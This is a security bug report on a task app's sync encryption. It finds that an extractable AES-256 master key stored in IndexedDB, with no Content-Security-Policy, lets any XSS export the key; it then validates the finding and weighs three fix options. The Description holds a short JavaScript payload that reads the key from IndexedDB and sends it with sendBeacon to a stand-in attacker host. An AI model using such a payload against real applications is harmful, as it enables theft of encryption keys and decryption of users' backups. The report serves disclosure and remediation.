# Sync AES-256 master key stored in IndexedDB is exportable, enabling XSS to exfiltrate it and permanently decrypt all backups

**Status:** REVIEW
**Bug ID:** SEC-000025
**Severity:** High

## Location
- `src/sync/credentials.ts` lines 5–15 (`getOrCreateSyncKey`) — the key is generated with `extractable = true`.
- `src/sync/credentials.ts` lines 17–23 (`deriveSyncToken`) and lines 25–30 (`exportKeyFile`) — the app itself relies on the key being exportable to derive the sync token and to write the "Export sync key" file, so an attacker can reuse the same primitive.
- `src/db/schema.ts` line 8–11 and `src/db/index.ts` lines 203–214 — the `CryptoKey` is persisted verbatim in the `credentials` object store, so it survives page reloads and is available to any script running on the origin.
- `index.html` — no `Content-Security-Policy` (nor is one set by nginx for the app root — see `nginx/sync-location.conf.template`, which only configures `/sync/*` paths), so there is no CSP fallback to blunt XSS.

## Description

The application performs client-side, end-to-end encryption of the entire app state before pushing it to the sync server. The confidentiality of every past and future encrypted backup rests on a single 256-bit AES-GCM key.

`getOrCreateSyncKey` (src/sync/credentials.ts):

```ts
const key = await crypto.subtle.generateKey(
  { name: 'AES-GCM', length: 256 },
  true,                       // <-- extractable
  ['encrypt', 'decrypt'],
);
await putCredentials(db, { id: 'main', cryptoKey: key });
```

The key is created as **extractable** and stored, as a live `CryptoKey`, in IndexedDB (`credentials` object store, keyPath `id`, key `'main'`). Because the key is extractable and IndexedDB is same-origin-accessible from any script on the app's origin, any JavaScript execution vulnerability lets an attacker do exactly what the legitimate app does in `exportKeyFile`:

```ts
const raw = await crypto.subtle.exportKey('raw', key);   // 32 raw bytes
// …base64url-encode and exfiltrate…
```

Concretely, a two-line payload defeats the whole encryption scheme:

```js
const db = await indexedDB.open('tasks-harmony', 4);
db.onsuccess = async () => {
  const creds = await new Promise((r) =>
    (db.result.transaction('credentials').objectStore('credentials').get('main')).onsuccess = (e) => r(e.target.result)
  );
  const raw = await crypto.subtle.exportKey('raw', creds.cryptoKey);
  navigator.sendBeacon('https://attacker.example/x', new Blob([raw]));
};
```

Impact chain once the key is stolen:

1. The attacker computes `syncToken = SHA-256(rawKey)` exactly as `deriveSyncToken` does (src/sync/credentials.ts lines 17–23) and can now impersonate the user against the sync server for the entire lifetime of that key — read, overwrite, or delete the encrypted blob at `/sync/{syncToken}` (see `sync-server/handlers/blob.ts`).
2. Every historical encrypted export the attacker has ever collected (leaked backups, previous `.enc` files, blobs cached in server backups) becomes decryptable, because AES-GCM confidentiality depends entirely on the key that has just been exfiltrated.
3. Every future backup remains decryptable until the user actively rotates the key. There is no forward secrecy: the same key is used for `encryptState`/`decryptState` on every push and pull (`src/sync/encrypt.ts`).
4. Recovery requires the user to manually generate a fresh key and re-encrypt — but even then, the attacker retains all past ciphertext they harvested before rotation.

Why an XSS is plausible enough that this matters as a first-class finding:

- The app has **no Content-Security-Policy**. `index.html` contains no `<meta http-equiv="Content-Security-Policy">`, and `nginx/sync-location.conf.template` only defines rules for `/sync/*` proxied paths, not for the static app root that serves `index.html`. There is therefore no defence-in-depth cap on script origins, `eval`, or inline event handlers.
- The app renders untrusted markdown (CDP pack descriptions, chore descriptions) through Milkdown — see `src/components/ui/MarkdownDisplay.tsx`. Prior link-sanitisation issues have already been reported (SEC-000019, SEC-000021 referenced in code comments), and additional bypasses in Milkdown or its remark/prosemirror stack would land straight into a DOM that has direct, unmediated read access to the raw sync key.
- The key is not merely "reachable via Web Crypto"; it is *designed* to be exported (that is exactly what `exportKeyFile` does). Any XSS can invoke the same primitive without touching any UI.

The fundamental defect is that a long-lived master key that protects *all* server-side backups is stored in a form (extractable + persistent + no CSP guard) where a single script-execution flaw permanently compromises confidentiality. A safer design would generate the key `extractable: false` for normal encrypt/decrypt use, and only regenerate/export an extractable key on explicit user action (recovery / device pairing) via a fresh derivation — leaving the persistent key beyond reach of drive-by script execution.

Note this is distinct from the excluded finding: the excluded issue concerns the *server* accepting the syncToken as a bare bearer token. This finding concerns the *client* storing the underlying AES key in an exfiltratable form, which compromises confidentiality of the plaintext (which the bearer-token issue does not — the server never sees plaintext) and cannot be mitigated by fixing the server-side auth alone.

## Validation

**CONFIRMED — High severity. Genuine, exploitable security issue.**

### Verification

All claims verified against source:

**Q1 — Key is `extractable: true`:** Confirmed. `src/sync/credentials.ts` line 10 passes `true` as the `extractable` argument to `crypto.subtle.generateKey`. The same key is used for all encrypt/decrypt operations via `encryptState`/`decryptState` in `src/sync/encrypt.ts`. There is no non-extractable copy kept for normal use.

**Q2 — Key is persisted verbatim in IndexedDB:** Confirmed. `putCredentials` stores the live `CryptoKey` object directly in the `credentials` object store (`src/db/index.ts` lines 208–212, schema at `src/db/schema.ts` lines 8–11). IndexedDB's structured-clone algorithm supports `CryptoKey` objects natively, so the `CryptoKey` — including its `extractable` bit — survives page reloads. Any script executing on the same origin can open the database, retrieve the key, and call `crypto.subtle.exportKey('raw', key)` to obtain the raw 32-byte secret.

**Q3 — No CSP to cap XSS blast radius:** Confirmed. `index.html` contains no `<meta http-equiv="Content-Security-Policy">` tag. `nginx/sync-location.conf.template` only configures `/sync/*` location blocks and adds no `add_header Content-Security-Policy` directive for the static app root. There is therefore no policy restricting script sources, `eval`, inline handlers, or `connect-src` to constrain exfiltration.

**Q4 — Same-origin XSS is a realistic threat surface:** The app renders user-controlled rich text (pack and chore descriptions) through Milkdown. SEC-000019 and SEC-000021 have already fixed specific XSS/link-injection issues in this rendering path, confirming the attack surface is real and has been exploited-in-class before.

**Q5 — Correct distinction from SEC-000024:** SEC-000024 concerns the server accepting `syncToken` as a bearer credential (auth model weakness, no confidentiality impact). This finding concerns the client storing the AES-256 key in exfiltratable form. Stealing the key allows decryption of *all* ciphertext, which SEC-000024 explicitly does not. These are separate, non-overlapping findings.

**Q6 — No duplicate in completed reports:** SEC-000022-0 (cache headers) and SEC-000024-3 (unimplemented HMAC) are unrelated. No prior report addresses the extractable key storage design.

### Severity Rationale

**High** (not Critical) because:

- **Confidentiality impact is severe and permanent for historical data.** An attacker who successfully exfiltrates the key can decrypt every past and future backup, including any ciphertext collected before the user rotates the key. There is no forward secrecy.
- **Attacker control over the trigger requires XSS.** The key is not directly exposed over the network; exploitation requires JavaScript execution on the app's origin. This is a realistic but prerequisite threat step.
- **XSS prerequisite is plausible, not theoretical.** The Milkdown rendering surface has produced confirmed prior issues; no CSP guard exists. A new bypass would immediately yield the master key.
- **Not Critical** because no network path exists to the raw key without a prior XSS; the attack is not zero-click or network-only.
- The design flaw — generating and persisting the persistent encryption key as `extractable: true` — is unnecessary for normal operation: `deriveSyncToken` and `exportKeyFile` could be refactored to work with a fresh extractable derivation rather than the persistent key, leaving the stored key `extractable: false` and unreachable by drive-by scripts.

## Fix Plan

**Status: REVIEW — requires product/spec decision on key-export UX before a fix can be designed.**

### Why this cannot be planned as a purely technical fix

The security defect is unambiguous: the AES-GCM master key is stored in IndexedDB as an `extractable: true` `CryptoKey`, and any script executing on the origin can call `crypto.subtle.exportKey('raw', key)` to obtain the 32-byte secret that protects every past and future encrypted backup. The obvious remediation the report itself sketches — persist the key `extractable: false` — is technically straightforward for `encryptState` / `decryptState`, which do not require raw key material.

The blocker is that the codebase has **two production features that today depend on the key being extractable at rest**, and neither can be preserved as-is under a non-extractable design:

1. **`deriveSyncToken` (`src/sync/credentials.ts` lines 17–23)** — used on every push and pull (`src/sync/server.ts` lines 71–72, 105–106) to identify the account against the sync server. It calls `crypto.subtle.exportKey('raw', key)` and hashes the result. This can be trivially fixed by persisting a precomputed `syncToken: string` alongside the credentials record (derived once at generation time and stored in cleartext — this does not weaken confidentiality; SEC-000024 already tracks the bearer-token concern separately). This part is not the blocker.

2. **`exportKeyFile` (`src/sync/credentials.ts` lines 25–30) + the "Export sync key" UI (`src/components/profile/ProfilePage.tsx` lines 126–142, 144–197)** — this is the real blocker. It is a documented user-facing feature that:
   - Lets the user back up the raw key to a JSON file so they can re-import it (`importKeyFile` → `putCredentials`) on another device to pair devices, and
   - Lets the user recover access after wiping browser storage.

   The entire product value of "encrypted sync + device pairing without a password" depends on the user being able to export the raw key material on demand. If the persistent key is non-extractable, `crypto.subtle.exportKey('raw', ...)` will throw and this feature stops working.

### The three product decisions that must be made before planning

Any real fix has to pick one, and each has significant UX consequences that only the product owner can approve:

**Option A — "Export at generation time only"** (closest to what the CONFIRMED report hints at):
   - Generate the key `extractable: true`, immediately derive syncToken, immediately re-import as `extractable: false`, persist only the non-extractable form + syncToken string.
   - `exportKeyFile` remains available *only during the first-run flow*, while the raw key still exists in memory. After the first page reload, the export button is greyed out with "your key can no longer be exported — rotate to a new key if you need a backup."
   - **UX cost:** users who did not export their key at setup are permanently locked into a single device unless they rotate. This is a real regression against today's flow, where a user can decide to enable multi-device sync at any point after setup.
   - **Migration cost:** existing users have an extractable key persisted. Do we (a) leave those keys alone (defect persists for existing users, only new users are safe), (b) force a re-key on next open (destroys server backup unless we push a re-encrypted blob first, which requires network availability at migration), or (c) prompt the user to export-then-rotate? Each has different failure modes.

**Option B — "Rotate on export"**:
   - `exportKeyFile` becomes "generate a new sync key". It generates a fresh key, uses it to re-encrypt current state, pushes the new blob to a new syncToken, tears down the old syncToken, then hands the user the raw new key to save.
   - **UX cost:** device pairing changes semantics — the "old" device now uses the new key too, and the old server blob is orphaned. Requires network and a successful push during the export click.
   - **Failure modes:** what if the re-encrypt push fails halfway? Partial rotation could brick sync. Needs a careful state machine.

**Option C — "Wrap the key with a user secret"**:
   - Introduce a password/passphrase. Derive a wrapping key via PBKDF2/Argon2. Store the wrapped key. Unwrap into a non-extractable `CryptoKey` at session start.
   - **UX cost:** introduces a password to what is currently a passwordless product. Large product decision.
   - **Benefit:** cleanly solves the XSS-exfiltration problem *and* SEC-000024 (server-side bearer-token issue) because the syncToken can also be derived post-unwrap.

None of A/B/C is a mechanical code change. Each requires the product owner to decide:
   1. Are we willing to lose the "export-anytime" UX (A), and how do we migrate existing users?
   2. Are we willing to change device-pairing semantics to a rotation flow (B)?
   3. Are we willing to introduce a passphrase (C)?

### Recommendation

Escalate to product owner to choose between A, B, or C, and to decide on the migration path for existing extractable keys already persisted in `credentials` object store `main`. Once the option and migration policy are picked, the technical fix becomes tractable:

- For **A**, the code change is small: modify `getOrCreateSyncKey` to re-import as non-extractable, add `syncToken: string` to `SyncCredentials`, refactor `deriveSyncToken` to read the stored string, disable the ProfilePage "Export sync key" button when the persisted key is non-extractable, and add a one-time export-during-setup affordance.
- For **B**, additionally implement an atomic "rotate + re-encrypt + push + expose raw" flow with rollback on network failure.
- For **C**, additionally implement passphrase entry UI, key-wrapping, and unwrap-on-session-start plumbing.

Because this planner cannot pick between three product-level UX changes on the user's behalf, this report is marked **REVIEW** rather than PLANNED.

### Test Plan

Deferred until the option above is chosen. Sketch of the test that will belong to the eventual fix (identical across A/B/C for the core defect):

- **File:** `src/sync/credentials.test.ts` (new).
- **Test name:** `getOrCreateSyncKey persists the encryption key as non-extractable`.
- **Assertion:** After `getOrCreateSyncKey(db)` returns, reopen the DB in a fresh handle, read `credentials.main.cryptoKey`, and assert `cryptoKey.extractable === false`. Additionally, assert `crypto.subtle.exportKey('raw', cryptoKey)` rejects with an `InvalidAccessError`.
- **RED expectation:** today's code generates the key with `extractable: true` and stores it as-is, so both assertions fail.
- **GREEN expectation:** post-fix code persists only a non-extractable form, so both assertions pass.

Option-specific tests (e.g. syncToken persistence for A, atomic rotation for B, unwrap flow for C) will be added once the option is chosen.
